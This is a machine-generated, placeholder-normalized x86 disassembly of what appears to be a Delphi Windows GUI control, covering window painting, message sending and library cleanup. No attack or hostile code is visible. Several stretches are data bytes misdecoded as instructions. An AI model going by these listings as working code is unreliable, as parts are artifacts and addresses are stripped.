push cs
push cs
push esp
inc ecx
outsb
imul ebp [ ebp + 0x61 ] 0x61506574
jb r-xdata
pop esp
insd
jae r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
add [ eax ] al
add [ ebx + 0x56 ] dl
test dl dl
je r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah dh
adc [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
mov [ esi + 0x210 ] 0x1
mov [ esi + 0x238 ] 0x1
mov [ esi + 0x236 ] 0x1
mov eax esi
test bl bl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_449498
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x64
mov eax esi
call sub_446740
mov edx 0x50
mov eax esi
call sub_446764
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x5c ]
add esp 0xfffffff0
call sub_4036f4
sub_439630
push ebx
push esi
add esp 0xfffffee8
mov esi edx
mov ebx eax
mov eax 0x80
call sub_43749c
mov edx esi
mov eax ebx
call sub_44a5f8
call sub_437510
cmp eax 0x40047
jge r-xdata
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_44a524
mov eax [ esi + 0x4 ]
xor edx edx
mov dl [ ebx + 0x210 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x235 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x236 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
and [ esi + 0x24 ] 0xfffffffc
call sub_437510
cmp eax 0x40047
jge r-xdata
mov eax ebx
call sub_439b44
mov [ esi + 0x34 ] eax
add esp 0x118
pop esi
pop ebx
retn
push 0x2
lea edx [ esp + 0x1c ]
mov eax [ ebx ]
call sub_4032e0
lea eax [ esp + 0x1c ]
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0x4
mov eax [ rw-data ]
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] 0x0
lea ecx [ esp + 0x4 ]
mov edx r-xdata
lea eax [ esi + 0x4c ]
call sub_409258
sub_439725
add [ eax ] al
add [ ebx - 0x75 ] dl
fadd st6
and [ ecx ] 0x2
add [ eax ] al
add dh al
and [ eax ] 0x2
add [ eax ] al
add [ ebx + 0xfe4e8c3 ] cl
add [ eax ] eax
mov eax ebx
call sub_439784
pop ebx
retn
sub_43974c
push ebx
push esi
push ecx
mov esi eax
mov bl [ esi + 0x208 ]
mov al [ esi + 0x220 ]
mov [ esp ] al
xor edx edx
mov eax esi
call sub_439ef8
mov eax esi
call sub_44ab08
mov al [ esp ]
mov [ esi + 0x220 ] al
mov [ esi + 0x208 ] bl
pop edx
pop esi
pop ebx
retn
sub_439784
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_439ef8
cmp [ ebx + 0x208 ] 0x0
je r-xdata
mov [ ebx + 0x208 ] 0x0
mov dl 0x1
mov eax ebx
call sub_439d18
sub_4397b4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax ebx
call sub_44e54c
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push 0xffffffff
push 0xffffffff
push eax
call InflateRect
sub_4397f0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44e5dc
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x13
push 0x0
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call GetDCEx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4398e7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call GetWindowRect
mov ecx [ ebp - 0x14 ]
neg ecx
mov edx [ ebp - 0x18 ]
neg edx
lea eax [ ebp - 0x18 ]
call sub_406388
mov eax [ ebp - 0xc ]
dec eax
push eax
mov eax [ ebp - 0x10 ]
dec eax
push eax
mov eax [ ebp - 0x14 ]
inc eax
push eax
mov eax [ ebp - 0x18 ]
inc eax
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
push 0x0
push 0x1
push 0x1
call CreatePen
mov ebx eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call SelectObject
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
call sub_42697c
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetBkColor
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call Rectangle
test esi esi
je r-xdata
push ebx
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call ReleaseDC
retn
push esi
mov eax [ ebp - 0x8 ]
push eax
call SelectObject
sub_439904
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_44bc48
push 0xffffffff
push 0x0
mov eax ebx
call sub_44d7a4
push eax
call InvalidateRect
mov eax [ ebx + 0x218 ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x21c ]
xor edx edx
xor eax eax
call sub_406364
cmp [ ebx + 0x210 ] 0x0
je r-xdata
push esp
mov eax ebx
call sub_44d7a4
push eax
call ValidateRect
mov eax ebx
call sub_44d7a4
push eax
call UpdateWindow
push 0x0
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_44d7a4
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
mov eax ebx
call sub_4469cc
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
sub eax edx
sar eax 0x1
jns r-xdata
push eax
mov eax ebx
call sub_446988
mov edx eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
lea eax [ esp + 0x4 ]
pop ecx
call sub_406388
adc edx 0x0
sub_4399d4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ ebx + 0x6 ]
dec ax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xd0 ]
pop esi
pop ebx
retn
dec ax
je r-xdata
cmp [ esi + 0x23c ] 0x0
jne r-xdata
jmp r-xdata
dec [ esi + 0x23c ]
mov eax esi
mov edx [ eax ]
call [ edx + 0xd4 ]
jmp r-xdata
pop esi
pop ebx
retn
sub_439ac4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x20c ]
call sub_404174
mov al [ ebx + 0x211 ]
mov [ esi + 0x4 ] al
mov eax [ ebx + 0x228 ]
mov [ esi + 0x8 ] eax
lea eax [ esi + 0xc ]
mov edx [ ebx + 0x230 ]
call sub_404174
mov eax [ ebx + 0x22c ]
mov [ esi + 0x10 ] eax
pop esi
pop ebx
retn
sub_439b04
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x20c ]
mov edx [ esi ]
call sub_404174
mov al [ esi + 0x4 ]
mov [ ebx + 0x211 ] al
mov eax [ esi + 0x8 ]
mov [ ebx + 0x228 ] eax
lea eax [ ebx + 0x230 ]
mov edx [ esi + 0xc ]
call sub_404174
mov eax [ esi + 0x10 ]
mov [ ebx + 0x22c ] eax
pop esi
pop ebx
retn
sub_439b44
cmp [ eax + 0x211 ] 0x0
je r-xdata
mov edx [ eax + 0x228 ]
test edx edx
je r-xdata
call sub_4374c8
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
jmp r-xdata
retn
sub_439b7c
push ebx
mov ebx eax
mov al [ ebx + 0x211 ]
test al al
je r-xdata
cmp [ ebx + 0x20c ] 0x0
je r-xdata
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
pop ebx
retn
cmp [ ebx + 0x230 ] 0x0
je r-xdata
mov eax [ ebx + 0x20c ]
jmp r-xdata
mov eax [ ebx + 0x22c ]
mov eax [ ebx + 0x230 ]
jmp r-xdata
pop ebx
retn
sub_439bc0
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_439b44
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x230 ] 0x0
je r-xdata
push 0x40
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0x20c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e058
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_439b7c
push eax
push r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e48c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x230 ]
push eax
push r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e434
jmp r-xdata
pop ebx
pop ebp
retn
sub_439c54
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
push ebp
call sub_439bc0
pop ecx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_439d0a
push [ fs : eax ]
mov [ fs : eax ] esp
xor ecx ecx
mov edx 0x30
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cmp eax 0x30
jne r-xdata
xor ecx ecx
mov edx 0x40
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cmp eax 0x40
jne r-xdata
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x214 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
call sub_41ddd0
xor ecx ecx
mov edx 0x44
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cmp eax 0x44
jne r-xdata
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x21c ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
call sub_41ddd0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439d11
mov eax [ ebp - 0x8 ]
call sub_403390
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x218 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
call sub_41ddd0
sub_439d18
test [ eax + 0x1c ] 0x2
je r-xdata
cmp dl [ eax + 0x208 ]
je r-xdata
test dl dl
je r-xdata
retn
test dl dl
je r-xdata
mov [ eax + 0x234 ] 0x1
retn
call sub_43a190
mov edx [ eax + 0x224 ]
push edx
mov cx [ eax + 0x23a ]
mov dx [ eax + 0x238 ]
call sub_43a0e0
jmp r-xdata
sub_439d6c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x211 ]
je r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x211 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
call sub_437510
cmp eax 0x40047
jl r-xdata
mov [ esi + 0x221 ] al
mov [ esi + 0x211 ] bl
lea eax [ esi + 0x20c ]
call sub_404120
xor eax eax
mov [ esi + 0x228 ] eax
lea eax [ esi + 0x230 ]
call sub_404120
xor eax eax
mov [ esi + 0x22c ] eax
test bl bl
jne r-xdata
mov al 0x1
mov eax esi
call sub_43a13c
xor edx edx
mov eax esi
call sub_439ef8
jmp r-xdata
sub_439de0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
call sub_4045d0
lea eax [ ebp - 0x1c ]
mov edx [ r-xdata ]
call sub_404ab8
xor eax eax
push ebp
push sub_439eea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov edx [ ebp - 0x8 ]
call sub_4082e8
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439ef1
lea eax [ ebp - 0x1c ]
mov edx [ r-xdata ]
call sub_404b88
lea eax [ ebp - 0x8 ]
call sub_404120
retn
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_439ac4
xor eax eax
push ebp
push sub_439eac
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
add eax 0x20c
mov edx [ ebp - 0x8 ]
call sub_404174
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] 0x0
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x228 ] edx
mov eax [ ebp - 0x4 ]
add eax 0x230
call sub_404120
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x22c ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_43a13c
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_439ef8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_439eb1
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_439b04
call sub_403b84
call sub_403bd8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439ef1
lea eax [ ebp - 0x1c ]
mov edx [ r-xdata ]
call sub_404b88
lea eax [ ebp - 0x8 ]
call sub_404120
retn
sub_439ef8
push esi
mov esi eax
cmp dl [ esi + 0x220 ]
je r-xdata
pop esi
retn
test dl dl
je r-xdata
mov eax esi
call sub_43a098
mov [ esi + 0x220 ] al
mov eax esi
call sub_439ff8
mov [ esi + 0x220 ] al
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov eax esi
mov si 0xffee
call sub_40358c
jmp r-xdata
sub_439f54
push ebx
push esi
mov esi edx
mov ebx eax
cmp si [ ebx + 0x238 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x238 ] si
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax ebx
call sub_43a190
mov edx esi
mov eax ebx
call sub_43a15c
sub_439fc8
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_439ef8
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
call sub_403b5c
sub_439ff8
push esi
add esp 0xffffffec
mov esi eax
cmp [ esi + 0x221 ] 0x0
je r-xdata
mov eax esi
call sub_44d780
cmp [ esi + 0x210 ] 0x0
jne r-xdata
mov eax esi
call sub_44ad0c
mov eax esi
call sub_439b7c
push eax
mov eax esi
call sub_439b44
mov ecx eax
mov edx 0x464
mov eax esi
call sub_448138
test eax eax
setne [ esp ]
cmp [ esi + 0x210 ] 0x0
jne r-xdata
lea edx [ esp + 0x1 ]
mov eax esi
call sub_446924
cmp [ esp ] 0x0
je r-xdata
lea edx [ esp + 0x1 ]
mov eax esi
call sub_446944
mov al [ esp ]
add esp 0x14
pop esi
retn
mov eax esi
call sub_439c54
mov [ esi + 0x238 ] 0x1
mov ax [ esi + 0x214 ]
mov [ esi + 0x23a ] ax
mov eax esi
mov edx [ eax ]
call [ edx + 0xc8 ]
sub_43a098
push ebx
push esi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x464
mov eax esi
call sub_44d7a4
push eax
call SendMessageA
test eax eax
setne bl
mov eax esi
mov edx [ eax ]
call [ edx + 0xcc ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_43a190
sub_43a0e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax ebx
call sub_44d780
mov eax ebx
call sub_439fc8
mov [ ebx + 0x208 ] 0x1
test esi esi
jne r-xdata
mov dx [ ebp - 0x2 ]
dec edx
mov eax edi
dec eax
call sub_406e80
push eax
mov ecx esi
mov edx 0x465
mov eax ebx
call sub_448138
dec eax
je r-xdata
or esi 0xffffffff
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov [ ebx + 0x208 ] 0x0
sub_43a15c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_439fc8
mov edi esi
dec edi
mov edx edi
mov eax edi
call sub_406e80
push eax
push 0x1
push 0x465
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_43a190
push ebx
push esi
mov esi eax
mov bx [ esi + 0x238 ]
dec ebx
mov edx ebx
mov eax ebx
call sub_406e80
push eax
push 0x1
push 0x465
mov eax esi
call sub_44d7a4
push eax
call SendMessageA
mov [ esi + 0x208 ] 0x0
inc [ esi + 0x23c ]
mov eax esi
mov edx [ eax ]
call [ edx + 0xd4 ]
pop esi
pop ebx
retn
sub_43a1d4
push ebx
push esi
cmp [ eax + 0x220 ] 0x0
je r-xdata
xor ebx ebx
mov bl 0x1
mov esi [ eax + 0x21c ]
mov [ edx ] esi
mov eax [ eax + 0x218 ]
mov [ ecx ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_43a2bc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43a32b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a332
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_404b88
mov eax rw-data
mov edx [ r-xdata ]
call sub_404b88
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_43a584
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
call sub_430744
mov [ esi + 0x5 ] al
call sub_437510
cmp eax 0x60000
setge al
mov [ esi + 0x4 ] al
mov eax esi
call sub_43adc8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_43a5d0
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax esi
call sub_43a670
call sub_430584
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403380
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_43a604
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp [ esi + 0x6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ esi + eax * 4 + 0x8 ]
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al bl
cmp [ esi + eax * 4 + 0x8 ] 0x0
jne r-xdata
mov edi ebx
and edi 0x7f
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esi + edi * 4 + 0x8 ] eax
sub_43a670
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
inc ebx
cmp bl 0x18
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
mov [ esi + edi * 4 + 0x8 ] eax
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_43a6b4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43a604
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_43a700
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43a604
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43a744
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov dl [ ebx ]
mov eax esi
call sub_43a604
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
test al al
je r-xdata
sub_43a7ac
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
mov esi [ ebp + 0x14 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax esi
call sub_404998
push eax
mov eax esi
call sub_404988
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push edi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43a604
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_43a810
mov [ ecx ] 0x0
xor eax eax
mov al dl
cmp eax 0xf
jge r-xdata
add eax 0xfffffff1
sub eax 0xc
jb r-xdata
add eax 0xfffffffe
sub eax 0x5
jb r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xf
jmp r-xdata
sub eax 0x2
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x8
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x4
mov eax 0x1b
jmp r-xdata
je r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x7
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0x1d
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_43a894
mov [ ecx ] 0x3
mov eax edx
add al 0xfe
sub al 0x7
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_43a8d0
mov [ ecx ] 0x17
xor eax eax
mov al dl
cmp eax 0x68
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov al [ eax + lookup_table_43a8ed ]
jmp [ eax * 4 + jump_table_43a956 ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x14
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1c
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0xd
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0xe
mov eax 0x24
jmp r-xdata
mov [ ecx + 0x4 ] 0xf
mov eax 0x28
jmp r-xdata
mov [ ecx + 0x4 ] 0x10
mov eax 0x2c
jmp r-xdata
mov [ ecx + 0x4 ] 0x11
mov eax 0x30
jmp r-xdata
mov [ ecx + 0x4 ] 0x12
mov eax 0x34
jmp r-xdata
mov [ ecx + 0x4 ] 0x13
mov eax 0x38
jmp r-xdata
mov [ ecx + 0x4 ] 0x14
mov eax 0x3c
jmp r-xdata
mov [ ecx + 0x4 ] 0x15
mov eax 0x40
jmp r-xdata
mov [ ecx + 0x4 ] 0x16
mov eax 0x44
jmp r-xdata
mov [ ecx + 0x4 ] 0x17
mov eax 0x48
jmp r-xdata
mov [ ecx + 0x4 ] 0x18
mov eax 0x4c
jmp r-xdata
mov [ ecx + 0x4 ] 0x19
mov eax 0x50
jmp r-xdata
mov [ ecx + 0x4 ] 0x1a
mov eax 0x54
jmp r-xdata
mov [ ecx + 0x4 ] 0x1b
mov eax 0x58
jmp r-xdata
mov [ ecx + 0x4 ] 0x1c
mov eax 0x5c
jmp r-xdata
mov [ ecx + 0x4 ] 0x1d
mov eax 0x60
jmp r-xdata
mov [ ecx + 0x4 ] 0x1e
mov eax 0x61
jmp r-xdata
mov [ ecx + 0x4 ] 0x1f
mov eax 0x62
jmp r-xdata
mov [ ecx + 0x4 ] 0x20
mov eax 0x63
jmp r-xdata
mov [ ecx + 0x4 ] 0x21
mov eax 0x64
jmp r-xdata
mov [ ecx + 0x4 ] 0x22
mov eax 0x65
jmp r-xdata
mov [ ecx + 0x4 ] 0x23
mov eax 0x66
jmp r-xdata
mov [ ecx + 0x4 ] 0x24
mov eax 0x67
jmp r-xdata
mov [ ecx + 0x4 ] 0x25
mov eax 0x68
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_43ac5c
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call GetWindowRect
mov eax [ ebp - 0x24 ]
neg eax
push eax
mov eax [ ebp - 0x28 ]
neg eax
push eax
lea eax [ ebp - 0x28 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_43adb7
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
push eax
mov eax [ ebp - 0x20 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov eax [ ebp - 0x28 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
lea ecx [ ebp - 0x34 ]
mov dl 0x2
mov eax esi
call sub_43a894
lea eax [ ebp - 0x28 ]
push eax
push 0x0
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_43a700
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
